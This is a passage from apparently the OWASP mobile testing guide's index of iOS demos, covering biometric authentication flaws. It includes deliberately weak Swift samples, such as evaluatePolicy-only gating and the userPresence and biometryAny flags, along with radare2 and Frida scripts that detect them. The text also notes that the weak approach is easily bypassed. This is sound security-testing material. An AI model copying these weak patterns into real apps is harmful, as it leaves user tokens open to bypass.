/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/LocalAuthentication.framework/Headers/LAPublicDefines.h\n\n#define kLAPolicyDeviceOwnerAuthenticationWithBiometrics        1\n#define kLAPolicyDeviceOwnerAuthentication                      2\n#define kLAPolicyDeviceOwnerAuthenticationWithWatch             3\n#define kLAPolicyDeviceOwnerAuthenticationWithBiometricsOrWatch 4\n#define kLAPolicyDeviceOwnerAuthenticationWithWristDetection    5\n#define kLAPolicyDeviceOwnerAuthenticationWithCompanion         kLAPolicyDeviceOwnerAuthenticationWithWatch\n#define kLAPolicyDeviceOwnerAuthenticationWithBiometricsOrCompanion kLAPolicyDeviceOwnerAuthenticationWithBiometricsOrWatch\n</code></pre> <p>Or you can view the full LAPublicDefines.h header online in public SDK mirrors on GitHub such as GitHub - xybp888/iOS-SDKs.</p>","tags":["ios","demo","MASTG-TEST-0266"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0041/MASTG-DEMO-0041/#evaluation","title":"Evaluation","text":"<p>The test fails because the output only shows references to biometric verification with LocalAuthentication API and no calls to any Keychain APIs requiring user presence (<code>SecAccessControlCreateWithFlags</code>).</p> <p>This approach can be easily bypassed as shown in  Intercepting HTTP Traffic by Hooking Network APIs at the Application Layer.</p>","tags":["ios","demo","MASTG-TEST-0266"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0042/MASTG-DEMO-0042/","title":"MASTG-DEMO-0042: Runtime Use of LAContext.evaluatePolicy with Frida","text":"<p>  Download MASTG-DEMO-0042 IPA   Open MASTG-DEMO-0042 Folder  Build MASTG-DEMO-0042 IPA</p>","tags":["ios","demo","MASTG-TEST-0267"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0042/MASTG-DEMO-0042/#sample","title":"Sample","text":"<p>This demo uses the same sample as  Uses of LAContext.evaluatePolicy with r2.</p> ../MASTG-DEMO-0041/MastgTest.swift<pre><code>import Foundation\nimport LocalAuthentication\n\nstruct MastgTest {\n\n    static func mastgTest(completion: @escaping (String) -&gt; Void) {\n        let token = \"8767086b9f6f976g-a8df76\"\n        let context = LAContext()\n        let reason = \"Authenticate to access your token\"\n\n        context.evaluatePolicy(.deviceOwnerAuthenticationWithBiometrics, localizedReason: reason) { success, error in\n            DispatchQueue.main.async {\n                if success {\n                    completion(\"\u2705 Retrieved token: \\(token)\")\n                    return\n                }\n\n                // Authentication failed: inspect the error code\n                let message: String\n                if let laError = error as? LAError {\n                    switch laError.code {\n                    case .userCancel:\n                        message = \"Authentication was cancelled by the user.\"\n                    case .userFallback:\n                        message = \"User tapped the fallback button (e.g. entered a password).\"\n                    case .systemCancel:\n                        message = \"Authentication was cancelled by the system (e.g. another app came to foreground).\"\n                    case .passcodeNotSet:\n                        message = \"Passcode is not set on the device.\"\n                    case .biometryNotAvailable:\n                        message = \"No biometric authentication is available on this device.\"\n                    case .biometryNotEnrolled:\n                        message = \"The user has not enrolled any biometrics.\"\n                    case .biometryLockout:\n                        message = \"Biometry is locked out due to too many failed attempts.\"\n                    default:\n                        // For any future or undocumented codes\n                        message = laError.localizedDescription\n                    }\n                } else {\n                    // Some other non\u2010LAError error\n                    message = error?.localizedDescription ?? \"Unknown authentication error.\"\n                }\n\n                completion(\"\u274c \\(message)\")\n            }\n        }\n    }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0267"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0042/MASTG-DEMO-0042/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for iOS installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn your app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code></li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp.MASTestApp-iOS -l ./script.js -l ../MASTG-DEMO-0044/script.js -o output.txt\n</code></pre> <pre><code>Interceptor.attach(ObjC.classes.LAContext[\"- evaluatePolicy:localizedReason:reply:\"].implementation, {\n  onEnter(args) {\n\n      const LAPolicy = {\n          1: \".deviceOwnerAuthenticationWithBiometrics\",\n          2: \".deviceOwnerAuthentication\"\n          3: \".deviceOwnerAuthenticationWithWatch\",\n          4: \".deviceOwnerAuthenticationWithBiometricsOrWatch\",\n          5: \".deviceOwnerAuthenticationWithWristDetection\",\n      };\n\n      const policy = args[2].toInt32();\n      const policyDescription = LAPolicy[policy] || \"Unknown Policy\";\n\n      console.log(`\\nLAContext.canEvaluatePolicy(${args[2]}) called with ${policyDescription} (${args[2]})\\n`);\n\n      // Use an arrow function so that `this` remains the same as in onEnter\n      const printBacktrace = (maxLines = 8) =&gt; {\n          console.log(\"\\nBacktrace:\");\n          let backtrace = Thread.backtrace(this.context, Backtracer.ACCURATE)\n              .map(DebugSymbol.fromAddress);\n\n          for (let i = 0; i &lt; Math.min(maxLines, backtrace.length); i++) {\n              console.log(backtrace[i]);\n          }\n      }\n      printBacktrace();\n  }\n});\n</code></pre>","tags":["ios","demo","MASTG-TEST-0267"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0042/MASTG-DEMO-0042/#observation","title":"Observation","text":"output.txt<pre><code>LAContext.canEvaluatePolicy(0x1) called with .deviceOwnerAuthenticationWithBiometrics (0x1)\n\n\nBacktrace:\n0x10095c35c MASTestApp!specialized static MastgTest.mastgTest(completion:)\n0x10095d4b4 MASTestApp!closure #1 in closure #1 in closure #1 in ContentView.body.getter\n0x19f6cbc54 SwiftUI!partial apply for closure #1 in closure #2 in ContextMenuBridge.contextMenuInteraction(_:willPerformPreviewActionForMenuWith:animator:)\n0x19f5d86d0 SwiftUI!partial apply for specialized thunk for @callee_guaranteed () -&gt; (@out A, @error @owned Error)\n0x19fca57c4 SwiftUI!specialized static MainActor.assumeIsolated&lt;A&gt;(_:file:line:)\n0x19fc721a8 SwiftUI!ButtonAction.callAsFunction()\n0x19f154c2c SwiftUI!partial apply for implicit closure #2 in implicit closure #1 in PlatformItemListButtonStyle.makeBody(configuration:)\n0x19f6813b4 SwiftUI!ButtonBehavior.ended()\n</code></pre> <p>The output reveals the use of <code>LAContext.evaluatePolicy(0x1, ...)</code> in the app. Policy <code>0x1</code> is <code>.deviceOwnerAuthenticationWithBiometrics</code>.</p>","tags":["ios","demo","MASTG-TEST-0267"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0042/MASTG-DEMO-0042/#evaluation","title":"Evaluation","text":"<p>The test fails because the output only shows calls to biometric verification with LocalAuthentication API and no calls to any Keychain APIs requiring user presence (<code>SecAccessControlCreateWithFlags</code>).</p>","tags":["ios","demo","MASTG-TEST-0267"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0043/MASTG-DEMO-0043/","title":"MASTG-DEMO-0043: Uses of kSecAccessControlUserPresence with r2","text":"<p>  Download MASTG-DEMO-0043 IPA   Open MASTG-DEMO-0043 Folder  Build MASTG-DEMO-0043 IPA</p>","tags":["ios","demo","MASTG-TEST-0268"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0043/MASTG-DEMO-0043/#sample","title":"Sample","text":"<p>The following sample correctly uses the Keychain API for local authentication (<code>SecAccessControlCreateWithFlags</code>) but it uses the <code>kSecAccessControlUserPresence</code> flag which allows fallback to device passcode when biometric authentication fails or isn't yet configured.</p> MastgTest.swift<pre><code>import SwiftUI\nimport LocalAuthentication\nimport Security\n\nstruct MastgTest {\n\n  static func mastgTest(completion: @escaping (String) -&gt; Void) {\n    let account = \"com.mastg.sectoken\"\n    let tokenData = \"8767086b9f6f976g-a8df76\".data(using: .utf8)!\n\n    // 1. Store the token in the Keychain with ACL flags\n    // 1a. Create an access\u2010control object requiring user presence\n    guard let accessControl = SecAccessControlCreateWithFlags(\n      nil,\n      kSecAttrAccessibleWhenUnlocked,\n      .userPresence,\n      nil\n    ) else {\n      completion(\"\u274c Failed to create access control\")\n      return\n    }\n\n    // 1b. Build your add\u2010item query\n    // Optional: you may provide a customized context to alter the default config, e.g. to set a \"reuse duration\".\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Optionally-Provide-a-Customized-Context\n    // Keychain services automatically makes use of the LocalAuthentication framework, even if you don't provide one.\n    //\n    //  let context = LAContext()\n    //  context.touchIDAuthenticationAllowableReuseDuration = 10\n    let storeQuery: [String: Any] = [\n      kSecClass as String:          kSecClassGenericPassword,\n      kSecAttrAccount as String:    account,\n      kSecValueData as String:      tokenData,\n      kSecAttrAccessControl as String: accessControl,\n      // kSecUseAuthenticationContext as String: context,\n    ]\n\n    // Before adding, we delete any existing item\n    SecItemDelete(storeQuery as CFDictionary)\n    let storeStatus = SecItemAdd(storeQuery as CFDictionary, nil)\n    guard storeStatus == errSecSuccess else {\n      completion(\"\u274c Failed to store token in Keychain (status \\(storeStatus))\")\n      return\n    }\n\n    // 2. Now let's retrieve the token\n    // Optional: you may provide a context with a localized reason.\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Provide-a-Prompt-When-Reading-the-Item\n    // Keychain services will use LAContext to prompt the user even if you don't provide one.\n    //\n    // let context = LAContext()\n    // context.localizedReason = \"Access your token from the keychain\"\n    let fetchQuery: [String: Any] = [\n      kSecClass as String:         kSecClassGenericPassword,\n      kSecAttrAccount as String:   account,\n      kSecReturnData as String:    true,\n      kSecMatchLimit as String:    kSecMatchLimitOne,\n      //kSecUseAuthenticationContext as String: context,\n    ]\n\n    var result: CFTypeRef?\n    let fetchStatus = SecItemCopyMatching(fetchQuery as CFDictionary, &amp;result)\n\n    if fetchStatus == errSecSuccess,\n       let data = result as? Data,\n       let token = String(data: data, encoding: .utf8) {\n      completion(\"\u2705 Retrieved token: \\(token)\")\n    } else {\n      completion(\"\u274c Authentication failed or token inaccessible (status \\(fetchStatus))\")\n    }\n  }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0268"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0043/MASTG-DEMO-0043/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Run <code>run.sh</code>.</li> </ol> biometricAuthenticationFallback.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Print xrefs to \\'Run analysis\\\"\naaa\n\n?e Print xrefs to \\'SecAccessControlCreateWithFlags\\\"\naxt @ sym.imp.SecAccessControlCreateWithFlags\n\n?e\n\n?e Print disassembly around \\\"SecAccessControlCreateWithFlags\\\" in the function\npdf @  0x100004194 | grep -C 5 \"SecAccessControlCreateWithFlags\"\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i biometricAuthenticationFallback.r2 -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0268"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0043/MASTG-DEMO-0043/#observation","title":"Observation","text":"output.asm<pre><code>Print xrefs to 'Run analysis\"\nPrint xrefs to 'SecAccessControlCreateWithFlags\"\nsym.MASTestApp.MastgTest.createAccessControl.Sec.Ref.d_n 0x100004194 [CALL:--x] bl sym.imp.SecAccessControlCreateWithFlags\n\nPrint disassembly around \"SecAccessControlCreateWithFlags\" in the function\n\u2502           0x100004180      mov x19, x0\n\u2502           0x100004184      add x3, sp, 0x10\n\u2502           0x100004188      mov x0, 0\n\u2502           0x10000418c      mov x1, x19\n\u2502           0x100004190      mov w2, 1\n\u2502           0x100004194      bl sym.imp.SecAccessControlCreateWithFlags\n\u2502       \u250c\u2500&lt; 0x100004198      cbz x0, 0x1000041ac\n\u2502       \u2502   0x10000419c      mov x20, x0\n\u2502       \u2502   0x1000041a0      mov x0, x19                               ; void *instance\n\u2502       \u2502   0x1000041a4      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502      \u250c\u2500\u2500&lt; 0x1000041a8      b 0x100004310\n</code></pre> <p>The output reveals the use of <code>SecAccessControlCreateWithFlags(allocator, protection, flags, error)</code> in the app. In this demo, we focus on the <code>flags</code> argument because it specifies the Access Control. <code>flags</code> is a third argument of the function, so it's at <code>x2/w2</code> register. By looking at the output, we can see that <code>w2</code> register holds value of <code>1</code>.</p> <pre><code>mov w2, 1\nbl sym.imp.SecAccessControlCreateWithFlags\n</code></pre> <p>The <code>flags</code> is an enum of <code>SecAccessControlCreateFlags</code>. <code>1</code> corresponds with <code>kSecAccessControlUserPresence</code> (see LAPublicDefines.h). This means that the app invokes <code>SecAccessControlCreateWithFlags(..., kSecAccessControlUserPresence)</code>, which means it falls back to device's passcode authentication.</p>","tags":["ios","demo","MASTG-TEST-0268"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0043/MASTG-DEMO-0043/#evaluation","title":"Evaluation","text":"<p>The test fails because the output shows references to biometric verification that falls back to device's passcode authentication, specifically <code>kSecAccessControlUserPresence</code>.</p> <p>Since this data requires protection with biometrics, it's recommended to use the <code>kSecAccessControlBiometryCurrentSet</code> or <code>kSecAccessControlBiometryAny</code> flags instead, being <code>kSecAccessControlBiometryCurrentSet</code> the most secure.</p>","tags":["ios","demo","MASTG-TEST-0268"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0044/MASTG-DEMO-0044/","title":"MASTG-DEMO-0044: Runtime Use of kSecAccessControlUserPresence with Frida","text":"<p>  Download MASTG-DEMO-0044 IPA   Open MASTG-DEMO-0044 Folder  Build MASTG-DEMO-0044 IPA</p>","tags":["ios","demo","MASTG-TEST-0269"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0044/MASTG-DEMO-0044/#sample","title":"Sample","text":"<p>This demo uses the same sample as  Uses of kSecAccessControlUserPresence with r2.</p> ../MASTG-DEMO-0043/MastgTest.swift<pre><code>import SwiftUI\nimport LocalAuthentication\nimport Security\n\nstruct MastgTest {\n\n  static func mastgTest(completion: @escaping (String) -&gt; Void) {\n    let account = \"com.mastg.sectoken\"\n    let tokenData = \"8767086b9f6f976g-a8df76\".data(using: .utf8)!\n\n    // 1. Store the token in the Keychain with ACL flags\n    // 1a. Create an access\u2010control object requiring user presence\n    guard let accessControl = SecAccessControlCreateWithFlags(\n      nil,\n      kSecAttrAccessibleWhenUnlocked,\n      .userPresence,\n      nil\n    ) else {\n      completion(\"\u274c Failed to create access control\")\n      return\n    }\n\n    // 1b. Build your add\u2010item query\n    // Optional: you may provide a customized context to alter the default config, e.g. to set a \"reuse duration\".\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Optionally-Provide-a-Customized-Context\n    // Keychain services automatically makes use of the LocalAuthentication framework, even if you don't provide one.\n    //\n    //  let context = LAContext()\n    //  context.touchIDAuthenticationAllowableReuseDuration = 10\n    let storeQuery: [String: Any] = [\n      kSecClass as String:          kSecClassGenericPassword,\n      kSecAttrAccount as String:    account,\n      kSecValueData as String:      tokenData,\n      kSecAttrAccessControl as String: accessControl,\n      // kSecUseAuthenticationContext as String: context,\n    ]\n\n    // Before adding, we delete any existing item\n    SecItemDelete(storeQuery as CFDictionary)\n    let storeStatus = SecItemAdd(storeQuery as CFDictionary, nil)\n    guard storeStatus == errSecSuccess else {\n      completion(\"\u274c Failed to store token in Keychain (status \\(storeStatus))\")\n      return\n    }\n\n    // 2. Now let's retrieve the token\n    // Optional: you may provide a context with a localized reason.\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Provide-a-Prompt-When-Reading-the-Item\n    // Keychain services will use LAContext to prompt the user even if you don't provide one.\n    //\n    // let context = LAContext()\n    // context.localizedReason = \"Access your token from the keychain\"\n    let fetchQuery: [String: Any] = [\n      kSecClass as String:         kSecClassGenericPassword,\n      kSecAttrAccount as String:   account,\n      kSecReturnData as String:    true,\n      kSecMatchLimit as String:    kSecMatchLimitOne,\n      //kSecUseAuthenticationContext as String: context,\n    ]\n\n    var result: CFTypeRef?\n    let fetchStatus = SecItemCopyMatching(fetchQuery as CFDictionary, &amp;result)\n\n    if fetchStatus == errSecSuccess,\n       let data = result as? Data,\n       let token = String(data: data, encoding: .utf8) {\n      completion(\"\u2705 Retrieved token: \\(token)\")\n    } else {\n      completion(\"\u274c Authentication failed or token inaccessible (status \\(fetchStatus))\")\n    }\n  }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0269"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0044/MASTG-DEMO-0044/#steps","title":"Steps","text":"<ol> <li>Install the app on a device ( Installing Apps)</li> <li>Make sure you have  Frida for iOS installed on your machine and the frida-server running on the device</li> <li>Run <code>run.sh</code> to spawn your app with Frida</li> <li>Click the Start button</li> <li>Stop the script by pressing <code>Ctrl+C</code></li> </ol> run.shscript.js <pre><code>#!/bin/bash\nfrida -U -f org.owasp.mastestapp.MASTestApp-iOS -l ./script.js -o output.txt\n</code></pre> <pre><code>const AccessControlFlags = {\n    kSecAccessControlUserPresence: 1 &lt;&lt; 0,\n    kSecAccessControlBiometryAny: 1 &lt;&lt; 1,\n    kSecAccessControlBiometryCurrentSet: 1 &lt;&lt; 3,\n    kSecAccessControlDevicePasscode: 1 &lt;&lt; 4,\n    kSecAccessControlWatch: 1 &lt;&lt; 5,\n    kSecAccessControlOr: 1 &lt;&lt; 14,\n    kSecAccessControlAnd: 1 &lt;&lt; 15,\n    kSecAccessControlPrivateKeyUsage: 1 &lt;&lt; 30,\n    kSecAccessControlApplicationPassword: 1 &lt;&lt; 31,\n  };\n\n\nInterceptor.attach(Module.getGlobalExportByName('SecAccessControlCreateWithFlags'), {\n    /* \n        func SecAccessControlCreateWithFlags(\n        _ allocator: CFAllocator?,\n        _ protection: CFTypeRef,\n        _ flags: SecAccessControlCreateFlags,\n        _ error: UnsafeMutablePointer&lt;Unmanaged&lt;CFError&gt;?&gt;?\n        )  -&gt; SecAccessControl?\n    */\n  onEnter(args) {\n    const flags = args[2]\n    const flags_description = parseAccessControlFlags(flags)\n    console.log(`\\SecAccessControlCreateWithFlags(..., 0x${flags.toString(16)}) called with ${flags_description}\\n`)\n\n      // Use an arrow function so that `this` remains the same as in onEnter\n      const printBacktrace = (maxLines = 8) =&gt; {\n          console.log(\"\\nBacktrace:\");\n          let backtrace = Thread.backtrace(this.context, Backtracer.ACCURATE)\n              .map(DebugSymbol.fromAddress);\n\n          for (let i = 0; i &lt; Math.min(maxLines, backtrace.length); i++) {\n              console.log(backtrace[i]);\n          }\n      }\n      printBacktrace();\n  }\n});\n\n\nfunction parseAccessControlFlags(value) {\n    const result = [];\n    for (const [name, bit] of Object.entries(AccessControlFlags)) {\n      if ((value &amp; bit) === bit) {\n        result.push(name);\n      }\n    }\n    return result;\n  }\n</code></pre>","tags":["ios","demo","MASTG-TEST-0269"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0044/MASTG-DEMO-0044/#observation","title":"Observation","text":"output.txt<pre><code>SecAccessControlCreateWithFlags(..., 0x1) called with kSecAccessControlUserPresence\n\nBacktrace:\n0x100a4c27c MASTestApp.debug.dylib!static MastgTest.mastgTest(completion:)\n0x100a4f000 MASTestApp.debug.dylib!$s10MASTestApp11ContentViewV4bodyQrvg7SwiftUI05TupleD0VyAE0D0PAEE7paddingyQrAE4EdgeO3SetV_12CoreGraphics7CGFloatVSgtFQOyAE6HStackVyAGyAE4TextV_AE6SpacerVAiEEAJyQrAN_ARtFQOyAiEE12cornerRadius_11antialiasedQrAQ_SbtFQOyAiEE10background_9alignmentQrqd___AE9AlignmentVtAeHRd__lFQOyAE6ButtonVyAiEE4fontyQrAE4FontVSgFQOyAiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAV_Qo__Qo__Qo_G_AE14LinearGradientVQo__Qo__Qo_tGG_Qo__AiEEAJyQrAN_ARtFQOyAiEEAY_AZQrAQ_SbtFQOyAiEEA__A0_Qrqd___A2_tAeHRd__lFQOyAiEE5frame8minWidth10idealWidth8maxWidth9minHeight11idealHeight9maxHeightA0_QrAR_A5RA2_tFQOyAE06ScrollD0VyAiEEAJyQrAN_ARtFQOyAiEEA21_A22_A23_A24_A25_A26_A27_A0_QrAR_A5RA2_tFQOyAV_Qo__Qo_G_Qo__AE5ColorVQo__Qo__Qo_AiEEAJyQrAN_ARtFQOyAiEEAJyQrAN_ARtFQOyAiEE14textFieldStyleyQrqd__AE0P10FieldStyleRd__lFQOyAE0P5FieldVyAVG_AE013RoundedBorderP10FieldStyleVQo__Qo__Qo_tGyXEfU_A18_yXEfU_yyScMYccfU_\n0x19ffdae30 SwiftUI!partial apply for implicit closure #2 in implicit closure #1 in WrappedButtonStyle.Body.body.getter\n0x1a02f1f28 SwiftUI!closure #1 in PressableGestureCallbacks.dispatch(phase:state:)\n0x1a005bb98 SwiftUI!thunk for @escaping @callee_guaranteed () -&gt; ()\n0x1a005bbc0 SwiftUI!thunk for @escaping @callee_guaranteed () -&gt; (@out ())\n0x1a005bb98 SwiftUI!thunk for @escaping @callee_guaranteed () -&gt; ()\n0x1a004a764 SwiftUI!static Update.end()\n</code></pre> <p>The output reveals the use of <code>SecAccessControlCreateWithFlags</code> in the app and lists all used flags.</p>","tags":["ios","demo","MASTG-TEST-0269"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0044/MASTG-DEMO-0044/#evaluation","title":"Evaluation","text":"<p>The test fails because the output shows the runtime use of <code>SecAccessControlCreateWithFlags(..., kSecAccessControlUserPresence)</code> which allows for a fallback to passcode authentication.</p> <p>Since this data requires protection with biometrics, It's recommended to use the <code>kSecAccessControlBiometryCurrentSet</code> or <code>kSecAccessControlBiometryAny</code> flags instead, being <code>kSecAccessControlBiometryCurrentSet</code> the most secure.</p>","tags":["ios","demo","MASTG-TEST-0269"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0045/MASTG-DEMO-0045/","title":"MASTG-DEMO-0045: Uses of kSecAccessControlBiometryCurrentSet with r2","text":"<p>  Download MASTG-DEMO-0045 IPA   Open MASTG-DEMO-0045 Folder  Build MASTG-DEMO-0045 IPA</p>","tags":["ios","demo","MASTG-TEST-0270"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0045/MASTG-DEMO-0045/#sample","title":"Sample","text":"<p>The following sample uses the <code>kSecAccessControlBiometryAny</code> flag, which is part of the biometric authentication API and can allow unauthorized access. This flag does not ensure that the associated keychain item becomes inaccessible when changes are made to the biometric database (e.g., when a new fingerprint or face is added). Consequently, users who enroll their biometric data after the item is created can unlock it.</p> MastgTest.swift<pre><code>import SwiftUI\nimport LocalAuthentication\nimport Security\n\nstruct MastgTest {\n\n  static func mastgTest(completion: @escaping (String) -&gt; Void) {\n    let account = \"com.mastg.sectoken\"\n    let tokenData = \"8767086b9f6f976g-a8df76\".data(using: .utf8)!\n\n    // 1. Store the token in the Keychain with ACL flags\n    // 1a. Create an access\u2010control object requiring user presence\n    guard let accessControl = SecAccessControlCreateWithFlags(\n      nil,\n      kSecAttrAccessibleWhenUnlocked,\n      .biometryAny,\n      nil\n    ) else {\n      completion(\"\u274c Failed to create access control\")\n      return\n    }\n\n    // 1b. Build your add\u2010item query\n    // Optional: you may provide a customized context to alter the default config, e.g. to set a \"reuse duration\".\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Optionally-Provide-a-Customized-Context\n    // Keychain services automatically makes use of the LocalAuthentication framework, even if you don't provide one.\n    //\n    //  let context = LAContext()\n    //  context.touchIDAuthenticationAllowableReuseDuration = 10\n    let storeQuery: [String: Any] = [\n      kSecClass as String:          kSecClassGenericPassword,\n      kSecAttrAccount as String:    account,\n      kSecValueData as String:      tokenData,\n      kSecAttrAccessControl as String: accessControl,\n      // kSecUseAuthenticationContext as String: context,\n    ]\n\n    // Before adding, we delete any existing item\n    SecItemDelete(storeQuery as CFDictionary)\n    let storeStatus = SecItemAdd(storeQuery as CFDictionary, nil)\n    guard storeStatus == errSecSuccess else {\n      completion(\"\u274c Failed to store token in Keychain (status \\(storeStatus))\")\n      return\n    }\n\n    // 2. Now let's retrieve the token\n    // Optional: you may provide a context with a localized reason.\n    // See https://developer.apple.com/documentation/localauthentication/accessing-keychain-items-with-face-id-or-touch-id#Provide-a-Prompt-When-Reading-the-Item\n    // Keychain services will use LAContext to prompt the user even if you don't provide one.\n    //\n    // let context = LAContext()\n    // context.localizedReason = \"Access your token from the keychain\"\n    let fetchQuery: [String: Any] = [\n      kSecClass as String:         kSecClassGenericPassword,\n      kSecAttrAccount as String:   account,\n      kSecReturnData as String:    true,\n      kSecMatchLimit as String:    kSecMatchLimitOne,\n      //kSecUseAuthenticationContext as String: context,\n    ]\n\n    var result: CFTypeRef?\n    let fetchStatus = SecItemCopyMatching(fetchQuery as CFDictionary, &amp;result)\n\n    if fetchStatus == errSecSuccess,\n       let data = result as? Data,\n       let token = String(data: data, encoding: .utf8) {\n      completion(\"\u2705 Retrieved token: \\(token)\")\n    } else {\n      completion(\"\u274c Authentication failed or token inaccessible (status \\(fetchStatus))\")\n    }\n  }\n}\n</code></pre>","tags":["ios","demo","MASTG-TEST-0270"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0045/MASTG-DEMO-0045/#steps","title":"Steps","text":"<ol> <li>Unzip the app package and locate the main binary file ( Exploring the App Package), which in this case is <code>./Payload/MASTestApp.app/MASTestApp</code>.</li> <li>Run <code>run.sh</code>.</li> </ol> biometricAuthenticationEnrollmentChange.r2<pre><code>e asm.bytes=false\ne scr.color=false\ne asm.var=false\n\n?e Print xrefs to \\'Run analysis\\\"\naaa\n\n?e Print xrefs to \\'SecAccessControlCreateWithFlags\\\"\naxt @ sym.imp.SecAccessControlCreateWithFlags\n\n?e\n\n?e Print disassembly around \\\"SecAccessControlCreateWithFlags\\\" in the function\npdf @  0x100004194 | grep -C 5 \"SecAccessControlCreateWithFlags\"\n</code></pre> run.sh<pre><code>#!/bin/bash\nr2 -q -i biometricAuthenticationFallback.r2 -A MASTestApp &gt; output.asm\n</code></pre>","tags":["ios","demo","MASTG-TEST-0270"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0045/MASTG-DEMO-0045/#observation","title":"Observation","text":"output.asm<pre><code>Print xrefs to 'Run analysis\"\nPrint xrefs to 'SecAccessControlCreateWithFlags\"\nsym.MASTestApp.MastgTest.createAccessControl.Sec.Ref.d_n 0x100004194 [CALL:--x] bl sym.imp.SecAccessControlCreateWithFlags\n\nPrint disassembly around \"SecAccessControlCreateWithFlags\" in the function\n\u2502           0x100004180      mov x19, x0\n\u2502           0x100004184      add x3, sp, 0x10\n\u2502           0x100004188      mov x0, 0\n\u2502           0x10000418c      mov x1, x19\n\u2502           0x100004190      mov w2, 2\n\u2502           0x100004194      bl sym.imp.SecAccessControlCreateWithFlags\n\u2502       \u250c\u2500&lt; 0x100004198      cbz x0, 0x1000041ac\n\u2502       \u2502   0x10000419c      mov x20, x0\n\u2502       \u2502   0x1000041a0      mov x0, x19                               ; void *instance\n\u2502       \u2502   0x1000041a4      bl sym.imp.objc_release                   ; void objc_release(void *instance)\n\u2502      \u250c\u2500\u2500&lt; 0x1000041a8      b 0x100004310\n</code></pre> <p>The output reveals the use of <code>SecAccessControlCreateWithFlags(allocator, protection, flags, error)</code> in the app. In this demo, we focus on the <code>flags</code> argument because it specifies the Access Control. <code>flags</code> is the third argument of the function, so it's at <code>x2/w2</code> register. By looking at the output, we can see that <code>w2</code> register holds value of <code>2</code>.</p> <pre><code>mov w2, 2\nbl sym.imp.SecAccessControlCreateWithFlags\n</code></pre> <p>The <code>flags</code> is an enum of <code>SecAccessControlCreateFlags</code>. <code>2</code> corresponds to <code>kSecAccessControlBiometryAny</code> (see LAPublicDefines.h). This means that the app invokes <code>SecAccessControlCreateWithFlags(..., kSecAccessControlBiometryAny)</code>, which means it will accept new biometric added in the system settings.</p>","tags":["ios","demo","MASTG-TEST-0270"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0045/MASTG-DEMO-0045/#evaluation","title":"Evaluation","text":"<p>The test fails because the output shows a reference to <code>SecAccessControlCreateWithFlags</code> with <code>kSecAccessControlBiometryAny</code>, which accepts any additional biometrics added after the Keychain entry was created.</p> <p>When it is required that the associated keychain item become inaccessible when changes are made to the biometric database (e.g., when a new fingerprint or face is added), the app must use the<code>kSecAccessControlBiometryCurrentSet</code> flag instead.</p>","tags":["ios","demo","MASTG-TEST-0270"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0046/MASTG-DEMO-0046/","title":"MASTG-DEMO-0046: Runtime Use of kSecAccessControlBiometryCurrentSet with Frida","text":"<p>  Download MASTG-DEMO-0046 IPA   Open MASTG-DEMO-0046 Folder  Build MASTG-DEMO-0046 IPA</p>","tags":["ios","demo","MASTG-TEST-0271"]},{"location":"MASTG/demos/ios/MASVS-AUTH/MASTG-DEMO-0046/MASTG-DEMO-0046/#sample","title":"Sample","text":"<p>This demo uses the same sample as  Uses of kSecAccessControlBiometryCurrentSet with r2.</p> ../MASTG-DEMO-0045/MastgTest.swift<pre><code>import SwiftUI\nimport LocalAuthentication\nimport Security\n\nstruct MastgTest {\n\n  static func mastgTest(completion: @escaping (String) -&gt; Void) {\n    let account = \"com.mastg.sectoken\"\n    let tokenData = \"8767086b9f6f976g-a8df76\".data(using: .utf8)!\n\n    // 1. Store the token in the Keychain with 